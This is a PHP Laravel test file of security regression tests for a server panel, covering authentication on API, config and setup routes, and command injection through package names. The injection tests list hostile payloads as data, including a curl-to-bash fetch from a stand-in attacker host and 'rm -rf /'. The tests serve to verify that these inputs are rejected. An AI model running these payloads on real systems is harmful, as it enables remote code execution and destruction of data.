<?php

namespace Tests\Feature;

use App\Models\Server;
use App\Models\User;
use App\Services\DaemonService;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\URL;
use Tests\TestCase;

/**
 * Regression tests for GitHub issues #25 + #26:
 * - Unauthenticated API/conf/sh routes (CRITICAL)
 * - Command injection via package install (CRITICAL)
 */
class SecurityRegressionTest extends TestCase
{
    use RefreshDatabase;

    private User $user;

    private string $token;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(RolesAndPermissionsSeeder::class);
        $this->user = User::factory()->create();
        $this->user->assignRole('Super Admin');
        $this->token = $this->user->createToken('test-token')->plainTextToken;
    }

    private function authed(): array
    {
        return ['Authorization' => 'Bearer '.$this->token];
    }

    /* ── Finding 1: unauthenticated routes ─────────────────────────── */

    public function test_api_management_routes_require_authentication(): void
    {
        $server = Server::factory()->create();

        $this->getJson('/api/servers')->assertStatus(401);
        $this->postJson('/api/servers', [])->assertStatus(401);
        $this->deleteJson('/api/servers/'.$server->server_id)->assertStatus(401);
        $this->postJson('/api/servers/'.$server->server_id.'/packages/install', ['package' => 'nginx'])->assertStatus(401);
        $this->postJson('/api/servers/'.$server->server_id.'/services/manage', [])->assertStatus(401);
        $this->getJson('/api/logs')->assertStatus(401);
    }

    public function test_conf_config_endpoints_require_authentication(): void
    {
        $this->get('/conf/nginx')->assertRedirect();          // guest → login
        $this->get('/conf/cron/1')->assertRedirect();
        $this->get('/conf/supervisor')->assertRedirect();
        $this->get('/conf/panel')->assertRedirect();
        $this->get('/conf/host/1')->assertRedirect();
        $this->get('/conf/alias/1')->assertRedirect();
        $this->get('/conf/php/1')->assertRedirect();
    }

    public function test_conf_endpoints_are_reachable_for_authenticated_user(): void
    {
        // Authenticated requests pass the auth middleware (200 = template served, not an auth failure)
        $this->actingAs($this->user)->get('/conf/nginx')->assertStatus(200);
        $this->actingAs($this->user)->get('/conf/supervisor')->assertStatus(200);
    }

    public function test_sh_setup_requires_valid_signature(): void
    {
        $this->get('/sh/setup/srv_unauthenticated')->assertStatus(403);
    }

    public function test_sh_setup_accepts_valid_signed_url(): void
    {
        Storage::fake('local');
        Storage::put('spikster/setup.sh', "PASS=???\nDBPASS=???\nSERVERID=???\n");

        $server = Server::factory()->notInstalled()->create();
        $url = URL::temporarySignedRoute('sh.setup', now()->addHours(1), ['server_id' => $server->server_id]);

        $response = $this->get($url);
        $response->assertStatus(200);
        $response->assertSee($server->password, false);
        $response->assertSee($server->database, false);
        $response->assertSee($server->server_id, false);
    }

    public function test_sh_setup_rejects_expired_signed_url(): void
    {
        Storage::fake('local');
        Storage::put('spikster/setup.sh', "PASS=???\n");

        $server = Server::factory()->notInstalled()->create();
        $url = URL::temporarySignedRoute('sh.setup', now()->subHour(1), ['server_id' => $server->server_id]);

        $this->get($url)->assertStatus(403);
    }

    public function test_sh_setup_rejects_already_provisioned_server(): void
    {
        Storage::fake('local');
        Storage::put('spikster/setup.sh', "PASS=???\n");

        $server = Server::factory()->create(); // status 1 = already provisioned
        $url = URL::temporarySignedRoute('sh.setup', now()->addHours(1), ['server_id' => $server->server_id]);

        $this->get($url)->assertStatus(404);
    }

    public function test_legacy_sh_deploy_and_rootreset_routes_are_removed(): void
    {
        $this->get('/sh/deploy/ste_legacy')->assertStatus(404);
        $this->get('/sh/servers/rootreset')->assertStatus(404);
    }

    /* ── Finding 2: command injection via package name ─────────────── */

    public function test_package_install_rejects_injection_payload(): void
    {
        $server = Server::factory()->create();
        $payloads = [
            'nginx; curl http://attacker.com/shell.sh | bash',
            'nginx && rm -rf /',
            '$(whoami)',
            '`whoami`',
            'nginx|id',
            'nginx & touch /tmp/pwned',
            'nginx\nwhoami',
        ];

        $daemon = $this->mock(DaemonService::class);
        $daemon->shouldReceive('send')->never();

        foreach ($payloads as $payload) {
            $this->withHeaders($this->authed())
                ->postJson('/api/servers/'.$server->server_id.'/packages/install', ['package' => $payload])
                ->assertStatus(422);
        }
    }

    public function test_package_install_rejects_missing_or_non_string_package(): void
    {
        $server = Server::factory()->create();

        $this->withHeaders($this->authed())
            ->postJson('/api/servers/'.$server->server_id.'/packages/install', [])
            ->assertStatus(422);

        $this->withHeaders($this->authed())
            ->postJson('/api/servers/'.$server->server_id.'/packages/install', ['package' => ['nginx']])
            ->assertStatus(422);
    }

    public function test_package_install_accepts_valid_package_name(): void
    {
        $server = Server::factory()->create();

        $daemon = $this->mock(DaemonService::class);
        $daemon->shouldReceive('send')
            ->once()
            ->with('server.package-install', ['package' => 'nginx'])
            ->andReturn(['output' => '']);

        $this->withHeaders($this->authed())
            ->postJson('/api/servers/'.$server->server_id.'/packages/install', ['package' => 'nginx'])
            ->assertStatus(200);
    }

    public function test_package_uninstall_rejects_injection_payload(): void
    {
        $server = Server::factory()->create();

        $daemon = $this->mock(DaemonService::class);
        $daemon->shouldReceive('send')->never();

        $this->withHeaders($this->authed())
            ->postJson('/api/servers/'.$server->server_id.'/packages/uninstall', ['package' => 'nginx; curl http://attacker.com/x.sh | bash'])
            ->assertStatus(422);
    }
}
